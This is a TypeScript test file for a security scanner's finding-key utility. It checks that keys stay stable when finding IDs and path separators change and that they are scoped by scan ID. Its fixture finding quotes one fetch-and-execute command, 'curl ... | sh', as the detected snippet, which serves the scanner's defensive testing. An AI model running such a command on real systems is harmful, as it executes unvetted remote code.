import { describe, expect, it } from 'vitest'
import { findingKey, indexFindings } from '@/lib/review/finding-key'
import type { Finding, ValidationResult } from '@/lib/validator/types'

const finding: Finding = {
  id: 'volatile-finding-id',
  axis: 'security',
  severity: 'high',
  category: 'Security',
  ruleId: 'network-pipe-shell',
  title: 'Network content piped to shell',
  message: 'The command executes downloaded content.',
  filePath: 'skills\\resolve-issue\\SKILL.md',
  lineNumber: 132,
  snippet: 'curl example.invalid/install | sh',
}

function result(findings: Finding[]): Pick<ValidationResult, 'id' | 'findings'> {
  return { id: 'scan-1', findings }
}

describe('findingKey', () => {
  it('is stable across volatile finding IDs and path separators', () => {
    expect(findingKey('scan-1', finding)).toBe(findingKey('scan-1', {
      ...finding,
      id: 'random-id',
      filePath: './skills/resolve-issue/SKILL.md',
    }))
  })

  it('is scoped to the immutable scan ID', () => {
    expect(findingKey('scan-1', finding)).not.toBe(findingKey('scan-2', finding))
  })

  it('indexes only scan-derived stable keys', () => {
    const index = indexFindings(result([finding]))

    expect(index.get(findingKey('scan-1', finding))).toBe(finding)
    expect(index.has(finding.id)).toBe(false)
  })
})
